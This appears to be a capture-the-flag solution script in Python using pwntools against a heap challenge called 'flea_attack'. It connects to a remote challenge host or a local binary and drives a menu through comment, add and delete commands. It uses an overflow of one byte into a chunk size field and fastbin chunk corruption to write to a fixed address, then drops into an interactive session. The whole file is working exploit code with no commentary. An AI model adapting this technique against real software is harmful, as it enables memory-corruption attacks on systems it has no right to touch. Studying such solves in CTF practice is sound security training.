from pwn import *

context.log_level = "debug"
def put_comment(comment):
    conn.sendafter("Some comment this note:", comment);

def add_name(size, name):
    conn.sendlineafter("> ", "1")  
    conn.sendlineafter("Size: ", str(size))
    conn.sendafter("Name: ", name)  
    conn.recvuntil("Addr: ")
    return int(conn.recvuntil("\n")[:-1],16)

def del_name(addr):
    conn.sendlineafter("> ", "2")  
    conn.sendlineafter("Addr: ", addr)  

def exploit():
    put_comment("A" * 0x5e + "\x71")
    LEAK = add_name(0x28, "A" * 0x10 + p64(0x0) + p64(0x61))
    del_name(hex(add_name(0x68, "A" * 0x48 + p64(0x11)))[2:])
    del_name(hex(LEAK + 0x20)[2:])
    pause()
    add_name(0x58, "A" * 0x8 + p64(0x71) + p64(0x204056))
    add_name(0x68, "A" * 0x68)
    add_name(0x68, "A" * (0x2 + 3 * 8))
    conn.interactive()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        HOST = "problem.harekaze.com"
        PORT = "20175"
        conn = remote(HOST, PORT)
    else:
        conn = process("./flea_attack.elf")
    exploit()
